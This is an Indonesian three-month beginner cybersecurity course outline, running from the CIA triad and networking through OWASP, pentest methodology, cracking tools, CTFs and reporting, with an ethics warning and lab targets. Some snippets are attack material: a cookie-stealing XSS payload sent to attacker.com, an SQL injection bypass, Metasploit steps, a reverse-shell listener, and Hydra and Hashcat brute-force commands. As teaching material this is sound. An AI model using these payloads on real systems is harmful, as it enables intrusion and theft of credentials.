# Modul Belajar: Cybersecurity dari Nol
**Durasi:** 3 Bulan | **Level:** Pemula → Siap Kerja  
**Lisensi:** Bebas dibagikan untuk keperluan edukasi

---

## Cara Menggunakan Modul Ini

Setiap minggu berisi:
- **Konsep Kunci** — inti materi yang harus dipahami
- **Istilah Penting** — kosakata teknis yang wajib hafal
- **Latihan** — aksi nyata untuk mempraktikkan teori
- **Cek Pemahaman** — pertanyaan mandiri sebelum lanjut

> ⚠️ **Etika Pertama:** Semua ilmu di sini hanya boleh dipraktikkan di lingkungan yang kamu miliki atau sudah mendapat izin eksplisit. Hacking tanpa izin = tindak pidana.

---

## 🗓️ BULAN 1: Fondasi yang Kokoh

### Minggu 1 — Memahami Medan Perang

**Konsep Kunci**

Sebelum belajar menyerang atau bertahan, pahami dulu aturan mainnya.

- **White Hat** — Hacker etis yang bekerja dengan izin untuk menemukan celah dan melindungi sistem.
- **Black Hat** — Hacker jahat yang menyerang tanpa izin untuk keuntungan pribadi atau merusak.
- **Grey Hat** — Di antara keduanya; mungkin menyerang tanpa izin tapi melaporkan temuannya tanpa niat merusak.

**CIA Triad** adalah tiga pilar utama keamanan siber:

| Pilar | Artinya | Contoh Ancaman |
|---|---|---|
| **Confidentiality** | Data hanya bisa diakses yang berhak | Data dicuri (data breach) |
| **Integrity** | Data tidak boleh diubah tanpa izin | File dimodifikasi oleh malware |
| **Availability** | Sistem harus bisa diakses saat dibutuhkan | Website dijatuhkan (DDoS) |

**Istilah Penting**
- `Threat` — Potensi ancaman
- `Vulnerability` — Kelemahan pada sistem
- `Exploit` — Cara memanfaatkan kelemahan tersebut
- `Risk` — Kemungkinan ancaman berhasil dieksploitasi

**Latihan**
1. Cari 3 berita insiden keamanan siber dari tahun ini.
2. Untuk setiap berita, identifikasi: pilar CIA mana yang dilanggar?

**Cek Pemahaman**
- Apa bedanya vulnerability dengan exploit?
- Kalau website e-commerce tidak bisa diakses selama 2 jam, pilar mana yang terganggu?

---

### Minggu 2 — Jaringan (Networking)

**Konsep Kunci**

Data bergerak melalui lapisan-lapisan. Memahami ini krusial untuk mengerti cara serangan bekerja.

**OSI Model (7 Lapisan) — Hafal dari bawah ke atas:**

| # | Lapisan | Analogi | Contoh |
|---|---|---|---|
| 7 | Application | Aplikasi yang kamu pakai | HTTP, DNS, FTP |
| 6 | Presentation | Penerjemah format data | SSL/TLS, enkripsi |
| 5 | Session | Menjaga koneksi tetap aktif | Login session |
| 4 | Transport | Pengiriman data end-to-end | TCP, UDP |
| 3 | Network | Penentuan jalur (routing) | IP Address |
| 2 | Data Link | Transfer antar perangkat lokal | MAC Address |
| 1 | Physical | Kabel dan sinyal fisik | Ethernet, WiFi |

**Protokol Wajib Tahu:**
- **TCP/IP** — Protokol utama internet; TCP menjamin data sampai, IP menentukan alamat.
- **HTTP/HTTPS** — Transfer halaman web; HTTPS = HTTP + enkripsi TLS.
- **DNS** — "Buku telepon" internet; mengubah nama domain → IP address.

**Port Penting:**

| Port | Protokol | Kegunaan |
|---|---|---|
| 22 | SSH | Remote akses terminal |
| 80 | HTTP | Web tidak terenkripsi |
| 443 | HTTPS | Web terenkripsi |
| 21 | FTP | Transfer file |
| 3306 | MySQL | Database |

**Latihan**
1. Buka terminal, jalankan `ping google.com` — amati hasilnya.
2. Buka browser, tekan F12 → tab Network → buka sebuah website. Amati request yang terjadi.
3. Cari tahu: apa itu `traceroute`/`tracert` dan jalankan ke salah satu website.

**Cek Pemahaman**
- Di lapisan OSI mana IP Address bekerja?
- Kenapa HTTPS lebih aman dari HTTP?

---

### Minggu 3 — Penguasaan Linux

**Konsep Kunci**

Linux adalah "bahasa ibu" dunia cybersecurity. Hampir semua tools profesional berjalan di sini.

**Instalasi Kali Linux:**
- Opsi 1: Virtual Machine (VirtualBox/VMware) — direkomendasikan untuk pemula
- Opsi 2: Dual Boot — lebih performa, lebih berisiko
- Opsi 3: WSL2 di Windows — paling mudah tapi ada limitasi

**Perintah Terminal Wajib:**

```bash
# Navigasi
ls -la          # Tampilkan semua file + detail (termasuk file tersembunyi)
cd /path/dir    # Pindah direktori
pwd             # Tampilkan direktori saat ini
find / -name "target.txt"  # Cari file

# Teks & Filter
cat file.txt    # Tampilkan isi file
grep "kata" file.txt       # Cari teks dalam file
grep -r "kata" /direktori  # Cari rekursif
cat log.txt | grep "error" # Kombinasi (pipe)

# Permission (sangat penting!)
ls -la          # Lihat permission (rwxrwxrwx)
chmod 755 file  # Ubah permission
sudo command    # Jalankan sebagai root

# Jaringan
ifconfig / ip a  # Lihat IP sendiri
netstat -tuln    # Lihat port yang terbuka
```

**Membaca Permission Linux:**
```
-rwxr-xr--
 ↑↑↑ ↑↑↑ ↑↑↑
 │   │   └── Others: r-- (baca saja)
 │   └─────── Group: r-x (baca & eksekusi)
 └─────────── Owner: rwx (semua akses)
```

**Latihan**
1. Navigasi ke setiap direktori utama Linux: `/etc`, `/var/log`, `/home`, `/tmp`.
2. Buat file, ubah permission-nya, lalu coba akses dengan user berbeda.
3. Gunakan `grep` untuk mencari kata "error" di `/var/log/syslog`.

**Cek Pemahaman**
- Apa arti permission `chmod 777`? Mengapa berbahaya?
- Apa bedanya `sudo` dan `su`?

---

### Minggu 4 — Cara Kerja Web

**Konsep Kunci**

Sebagian besar serangan modern menarget aplikasi web. Pahami fondasinya.

**Siklus HTTP Request-Response:**
```
Browser                         Server
  │── GET /login HTTP/1.1 ────▶ │
  │   Host: example.com         │
  │   (headers)                 │
  │                             │ [proses]
  │ ◀── HTTP/1.1 200 OK ────── │
  │     Content-Type: text/html │
  │     (body: halaman HTML)    │
```

**HTTP Methods:**
- `GET` — Meminta data (tidak mengubah server)
- `POST` — Mengirim data (form login, submit data)
- `PUT/PATCH` — Mengubah data
- `DELETE` — Menghapus data

**HTTP Status Code Penting:**
| Kode | Artinya |
|---|---|
| 200 | OK — sukses |
| 301/302 | Redirect |
| 401 | Unauthorized — perlu login |
| 403 | Forbidden — tidak punya izin |
| 404 | Not Found |
| 500 | Internal Server Error |

**Cookie vs Session:**

| | Cookie | Session |
|---|---|---|
| Disimpan di | Browser (client) | Server |
| Keamanan | Lebih rentan (bisa dicuri) | Lebih aman |
| Contoh isi | `session_id=abc123` | Data user asli |

Alur login: Server buat session → kirim `session_id` via Cookie → browser kirim Cookie di setiap request berikutnya.

**Latihan**
1. Buka browser → F12 → Application → Cookies. Amati cookie di website favoritmu.
2. Gunakan tab Network di DevTools, filter `XHR`. Login ke suatu website dan amati request-nya.
3. Install **Postman** atau gunakan `curl` untuk kirim GET request manual ke sebuah API publik.

**Cek Pemahaman**
- Apa yang terjadi kalau session cookie berhasil dicuri attacker?
- Kenapa ada HTTPS jika cookie sudah ada?

---

## 🗓️ BULAN 2: Serangan dan Kerentanan

### Minggu 5 — Web Vulnerabilities (OWASP Top 10)

**Konsep Kunci**

OWASP Top 10 adalah daftar 10 kerentanan web paling kritis dan umum ditemukan di dunia nyata.

**SQL Injection (SQLi)**

Terjadi ketika input user tidak divalidasi dan dimasukkan langsung ke query database.

```sql
-- Query normal:
SELECT * FROM users WHERE username='danz' AND password='1234';

-- Payload injeksi: username diisi: ' OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password='apapun';
-- Hasilnya: login berhasil tanpa password yang benar!
```

**Cross-Site Scripting (XSS)**

Attacker menyisipkan script JavaScript berbahaya ke halaman web yang kemudian dieksekusi oleh browser korban.

```html
<!-- Input form komentar diisi:
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Jika tidak difilter, siapa pun yang membuka halaman itu akan mengirim cookie mereka ke attacker.
```

**OWASP Top 10 (ringkas):**
1. Broken Access Control
2. Cryptographic Failures
3. **Injection** (SQLi, dll)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable & Outdated Components
7. Identification & Authentication Failures
8. Software & Data Integrity Failures
9. Security Logging Failures
10. **Server-Side Request Forgery (SSRF)**

**Latihan**
1. Setup **DVWA** (Damn Vulnerable Web Application) di lokal via Docker: `docker run --rm -it -p 80:80 vulnerables/web-dvwa`
2. Coba SQL Injection di DVWA level Low.
3. Eksplorasi **PortSwigger Web Security Academy** (gratis) — kerjakan lab SQLi pertama.

**Cek Pemahaman**
- Apa perbedaan Stored XSS dan Reflected XSS?
- Bagaimana `prepared statement` mencegah SQL Injection?

---

### Minggu 6 — Metodologi Hacking & Eksploitasi

**Konsep Kunci**

Hacker profesional bekerja secara sistematis, bukan asal tebak-tebak.

**5 Fase Penetration Testing:**

```
1. Reconnaissance  →  2. Scanning  →  3. Exploitation
        ↓                                      ↓
   Kumpulkan info              Masuk ke sistem target
   (OSINT, DNS, dll)
                                               ↓
                         4. Post-Exploitation  →  5. Reporting
                         (Privilege escalation,      (Dokumen temuan)
                          lateral movement)
```

**Tools Utama Fase Ini:**

**Nmap** (Network Mapper):
```bash
nmap 192.168.1.1          # Scan basic
nmap -sV 192.168.1.1      # Deteksi versi service
nmap -A 192.168.1.0/24    # Aggressive scan satu network
nmap -p 80,443,22 target  # Scan port spesifik
```

**Metasploit Framework:**
```bash
msfconsole                    # Buka Metasploit
search eternalblue            # Cari exploit
use exploit/windows/smb/...   # Pilih exploit
set RHOSTS 192.168.1.5        # Set target
run                           # Eksekusi
```

**Reverse Shell** — Konsep:
```
Target ──── koneksi keluar ────▶ Attacker (listener)
                                  nc -lvnp 4444
```
Normal shell: kita konek ke target. Reverse shell: target yang konek balik ke kita — berguna saat target ada di balik firewall.

**Latihan**
1. Praktikkan Nmap di jaringan lokal sendiri (scan router kamu sendiri).
2. Setup **Metasploitable2** sebagai target latihan dan coba exploit dengan Metasploit.
3. Platform gratis: **TryHackMe** — room "Metasploit" dan "Nmap".

**Cek Pemahaman**
- Apa perbedaan active reconnaissance vs passive reconnaissance?
- Kenapa reverse shell sering lebih efektif dari bind shell?

---

### Minggu 7 — Kriptografi

**Konsep Kunci**

Kriptografi adalah tulang punggung keamanan digital. Pahami bedanya agar tidak keliru dalam implementasi.

**Enkripsi vs Hashing:**

| | Enkripsi | Hashing |
|---|---|---|
| Arah | Dua arah (bisa decrypt) | Satu arah (tidak bisa balik) |
| Butuh kunci? | Ya | Tidak |
| Kegunaan | Menyimpan pesan rahasia | Menyimpan password |
| Contoh | AES, RSA | MD5, SHA-256, bcrypt |

**Jenis Enkripsi:**
- **Symmetric** — Satu kunci untuk enkripsi & dekripsi (AES). Cepat, cocok untuk data besar.
- **Asymmetric** — Kunci publik untuk enkripsi, kunci privat untuk dekripsi (RSA). Dipakai di HTTPS, SSL.

**Kenapa MD5/SHA1 tidak aman untuk password:**
- Sama input → selalu sama output (deterministic)
- Bisa dibuat Rainbow Table (tabel precomputed hash)
- Gunakan **bcrypt** atau **Argon2** yang punya salt dan slow hashing

**Password Cracking:**
```bash
# Hashcat — GPU-based cracking
hashcat -m 0 hash.txt wordlist.txt        # MD5
hashcat -m 1800 hash.txt wordlist.txt     # SHA-512crypt

# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --show hash.txt                      # Lihat hasil
```

**Latihan**
1. Generate hash MD5 dan SHA-256 dari string yang sama, amati perbedaan panjangnya.
2. Download `rockyou.txt` wordlist dan crack hash MD5 sederhana dengan Hashcat atau John.
3. Eksplorasi **CyberChef** (online) untuk encoding/decoding berbagai format.

**Cek Pemahaman**
- Kenapa "salting" penting dalam penyimpanan password?
- Apa itu collision attack pada hash function?

---

### Minggu 8 — Keamanan Sistem (Sisi Pertahanan)

**Konsep Kunci**

Pemahaman sisi defender sama pentingnya dengan attacker. Banyak karier ada di sini.

**Active Directory (AD):**
- Layanan Microsoft untuk mengelola pengguna, komputer, dan kebijakan dalam jaringan korporat.
- Target favorit attacker karena jika dikuasai = kuasai seluruh jaringan.
- Konsep kunci: Domain, Domain Controller, LDAP, Kerberos authentication.

**Firewall:**
- **Stateless** — Hanya cek header paket (asal, tujuan, port). Cepat tapi terbatas.
- **Stateful** — Melacak state koneksi. Lebih cerdas.
- **WAF (Web Application Firewall)** — Khusus filter traffic HTTP/HTTPS.

**System Hardening — Checklist Dasar:**
- [ ] Nonaktifkan service yang tidak digunakan
- [ ] Update dan patch sistem secara rutin
- [ ] Terapkan prinsip **Least Privilege** (user hanya punya akses minimum yang dibutuhkan)
- [ ] Aktifkan logging dan monitoring
- [ ] Gunakan strong password + MFA
- [ ] Enkripsi data sensitif at rest dan in transit
- [ ] Disable default credentials

**Latihan**
1. Jalankan `sudo systemctl list-units --type=service` di Linux — nonaktifkan service yang tidak perlu.
2. Baca dokumentasi **CIS Benchmarks** (gratis) untuk Linux atau Windows.
3. Setup dan eksplorasi **Wazuh** (SIEM open source) di lingkungan lab.

**Cek Pemahaman**
- Apa perbedaan IDS dan IPS?
- Kenapa Least Privilege penting meski user adalah karyawan terpercaya?

---

## 🗓️ BULAN 3: Alat Profesional dan Karier

### Minggu 9 — Keamanan Jaringan Tingkat Lanjut

**Konsep Kunci**

**IDS vs IPS:**

| | IDS (Intrusion Detection System) | IPS (Intrusion Prevention System) |
|---|---|---|
| Fungsi | Mendeteksi & memberi alert | Mendeteksi & memblokir otomatis |
| Posisi | Pasif (monitor) | Inline (aktif di jalur traffic) |
| Contoh | Snort (mode IDS) | Snort (mode IPS), Suricata |

**VPN (Virtual Private Network):**
- Membuat "terowongan" terenkripsi antara client dan server.
- Melindungi traffic dari penyadapan (terutama di WiFi publik).
- Tidak membuat kamu anonymous sepenuhnya — VPN provider masih bisa log aktivitasmu.

**Man-in-the-Middle (MitM) Attack:**
```
Client ──▶ [Attacker menyadap di sini] ──▶ Server
```
- Attacker memposisikan dirinya di antara komunikasi dua pihak.
- Teknik: ARP Spoofing, DNS Spoofing, SSL Stripping.
- Tools: Bettercap, Ettercap.

**DDoS (Distributed Denial of Service):**
- Banjiri target dengan traffic dari banyak sumber (botnet) hingga collapse.
- Jenis: Volumetric (bandwidth), Protocol (SYN flood), Application layer (HTTP flood).

**Latihan**
1. Setup Snort atau Suricata di VM, buat rule sederhana untuk mendeteksi ping.
2. Praktikkan ARP Spoofing di lab terisolasi dengan Bettercap antara dua VM.
3. Pelajari cara mitigasi DDoS: rate limiting, anycast, CDN, traffic scrubbing.

**Cek Pemahaman**
- Kenapa HTTPS tidak cukup untuk mencegah MitM sepenuhnya?
- Apa perbedaan DoS dan DDoS?

---

### Minggu 10 — Alat Utama Profesional ("The Big Four")

**Konsep Kunci**

Kuasai empat tools ini dan kamu sudah punya toolkit dasar seorang pentester profesional.

**1. Wireshark — Analisis Paket Jaringan**
```
Filter berguna:
http                     → Semua traffic HTTP
tcp.port == 443          → Traffic HTTPS
ip.addr == 192.168.1.5   → Traffic dari/ke IP tertentu
http.request.method == "POST"  → Hanya POST request
```
Gunakan untuk: Analisis protokol, cari credential plain-text, debug masalah jaringan.

**2. Burp Suite — Proxy & Web Application Testing**
- **Proxy** — Intercept dan modifikasi request/response HTTP sebelum sampai server.
- **Repeater** — Kirim ulang dan modifikasi request manual untuk testing.
- **Intruder** — Otomasi serangan (brute force, fuzzing).
- **Scanner** — Auto-detect vulnerability (versi Pro).

**3. Nmap — Network Discovery & Scanning**
```bash
# Cheat sheet
nmap -sn 192.168.1.0/24        # Ping sweep (host discovery)
nmap -sV --version-intensity 5  # Deteksi versi service agresif
nmap --script vuln target       # Scan vulnerability dengan script
nmap -oN output.txt target      # Simpan hasil ke file
```

**4. Hydra — Brute Force Credential**
```bash
hydra -l admin -P wordlist.txt ssh://192.168.1.5
hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

**Latihan**
1. **Wireshark:** Capture traffic saat kamu login ke HTTP website (cari password plain-text).
2. **Burp Suite:** Setup sebagai proxy, intercept request login, modifikasi parameternya.
3. **Hydra:** Brute force SSH ke Metasploitable2 dengan wordlist rockyou.txt.

**Cek Pemahaman**
- Apa perbedaan aktif dan pasif dalam konteks penggunaan Wireshark?
- Kapan kamu harus pakai Burp Suite vs Wireshark?

---

### Minggu 11 — Capture The Flag (CTF) & Bug Bounty

**Konsep Kunci**

CTF adalah kompetisi cybersecurity yang mensimulasikan skenario hacking nyata. Ini adalah cara terbaik untuk mengasah skill dan membangun portofolio.

**Platform CTF Berdasarkan Level:**

| Platform | Level | Catatan |
|---|---|---|
| **PicoCTF** | Pemula | Cocok untuk mulai, gamifikasi bagus |
| **TryHackMe** | Pemula–Menengah | Guided, ada "learning path" terstruktur |
| **Hack The Box** | Menengah–Lanjut | Lebih realistis, komunitas aktif |
| **CTFtime.org** | Semua | Kalender kompetisi CTF global |

**Kategori CTF yang Umum:**
- **Web** — Eksploitasi web vulnerabilities
- **Forensics** — Analisis file, log, memory dump
- **Cryptography** — Crack cipher, analisis enkripsi
- **Reverse Engineering** — Analisis binary/executable
- **Pwn/Binary Exploitation** — Buffer overflow, memory corruption
- **OSINT** — Kumpulkan informasi dari sumber publik

**Bug Bounty — Berburu Celah Berbayar:**
- Platform: **HackerOne**, **Bugcrowd**, **Intigriti**
- Mulai dari program dengan scope luas dan reward rendah untuk berlatih
- Baca **Hall of Fame** dan **disclosed reports** untuk belajar dari temuan orang lain
- Wajib baca: **Bug Bounty Hunting Essentials** (tersedia di berbagai platform)

**Latihan**
1. Selesaikan 3 challenge di TryHackMe path "Pre-Security" atau "Jr Penetration Tester".
2. Baca 5 disclosed bug bounty report di HackerOne untuk memahami format laporan profesional.
3. Ikuti satu event CTF online di CTFtime.org (banyak yang ramah pemula).

**Cek Pemahaman**
- Apa perbedaan CTF "Jeopardy style" vs "Attack-Defense"?
- Apa hal pertama yang harus dilakukan saat memulai bug bounty program baru?

---

### Minggu 12 — Menjadi Profesional & Pelaporan

**Konsep Kunci**

Skill teknis tanpa kemampuan komunikasi = setengah profesional. Laporan yang baik adalah produk nyata dari pekerjaan seorang pentester.

**Struktur Laporan Pentest Profesional:**

```
1. Executive Summary
   └── Ringkasan non-teknis untuk manajemen
       (berapa temuan kritis, dampak bisnis)

2. Scope & Methodology
   └── Apa yang diuji, kapan, dengan metode apa

3. Findings (per kerentanan):
   ├── Judul & severity (Critical/High/Medium/Low/Info)
   ├── Deskripsi
   ├── Langkah reproduksi (step-by-step)
   ├── Bukti/Evidence (screenshot, payload)
   ├── Dampak (impact)
   └── Rekomendasi perbaikan

4. Kesimpulan & Rekomendasi Strategis
```

**CVSS Score — Standar Penilaian Severity:**
- **Critical** (9.0–10.0) — Eksploitasi mudah, dampak maksimal
- **High** (7.0–8.9) — Serius, perlu segera diperbaiki
- **Medium** (4.0–6.9) — Perlu diperbaiki tapi tidak mendesak
- **Low** (0.1–3.9) — Risiko minimal
- **Info** — Bukan kerentanan, tapi perlu diperhatikan

**Sertifikasi yang Relevan untuk Karier:**

| Sertifikasi | Level | Fokus |
|---|---|---|
| **CompTIA Security+** | Pemula | Fondasi umum, diakui luas |
| **eJPT (eLearnSecurity)** | Pemula | Praktis, entry-level pentesting |
| **CEH** | Menengah | Broad, populer di Asia |
| **OSCP (Offensive Security)** | Lanjut | Gold standard pentesting, hands-on |

**Jalur Karier Cybersecurity:**
- **SOC Analyst** → Monitor & respons insiden
- **Penetration Tester** → Uji keamanan sistem secara legal
- **Bug Bounty Hunter** → Freelance, berburu celah berbayar
- **Security Engineer** → Bangun & maintain sistem keamanan
- **Malware Analyst** → Analisis kode berbahaya
- **Threat Intelligence** → Analisis aktor dan taktik ancaman

**Latihan**
1. Tulis laporan pentest lengkap dari salah satu mesin yang kamu selesaikan di TryHackMe/HTB.
2. Buat akun di LinkedIn dan mulai dokumentasikan perjalanan belajarmu.
3. Buat akun di GitHub dan upload writeup CTF pertamamu.

**Cek Pemahaman**
- Apa yang dimaksud "proof of concept" dalam laporan pentest?
- Mengapa executive summary ditulis dalam bahasa non-teknis?

---

## 📚 Sumber Belajar Tambahan

### Platform Gratis
- [TryHackMe](https://tryhackme.com) — Lab guided untuk pemula
- [PortSwigger Web Academy](https://portswigger.net/web-security) — Terbaik untuk web hacking
- [HackTheBox](https://hackthebox.com) — Lab realistis untuk level menengah ke atas
- [PicoCTF](https://picoctf.org) — CTF untuk pelajar
- [CyberDefenders](https://cyberdefenders.org) — Fokus blue team/defensive

### Bacaan Wajib
- *The Web Application Hacker's Handbook* — Stuttard & Pinto
- *Penetration Testing* — Georgia Weidman
- *OWASP Testing Guide* (gratis di owasp.org)
- *Hacking: The Art of Exploitation* — Jon Erickson

### Komunitas
- Reddit: r/netsec, r/hacking, r/AskNetsec
- Discord: TryHackMe, Hack The Box
- Twitter/X: Ikuti peneliti keamanan aktif

---

## ✅ Progress Tracker

Centang setiap minggu yang sudah kamu selesaikan:

- [ ] Minggu 1: Etika & CIA Triad
- [ ] Minggu 2: Networking & OSI Model
- [ ] Minggu 3: Linux Terminal
- [ ] Minggu 4: Cara Kerja Web
- [ ] Minggu 5: OWASP Top 10 & DVWA
- [ ] Minggu 6: Metodologi Hacking
- [ ] Minggu 7: Kriptografi & Password Cracking
- [ ] Minggu 8: System Hardening
- [ ] Minggu 9: Network Security Lanjut
- [ ] Minggu 10: The Big Four Tools
- [ ] Minggu 11: CTF & Bug Bounty
- [ ] Minggu 12: Laporan & Karier

---

> **Ingat:** Consistency beats intensity. 1 jam sehari selama 90 hari jauh lebih efektif dari marathon belajar seminggu lalu berhenti sebulan.

---
*Modul ini dibuat sebagai panduan awal. Setiap topik bisa dan harus diperdalam lebih lanjut.*
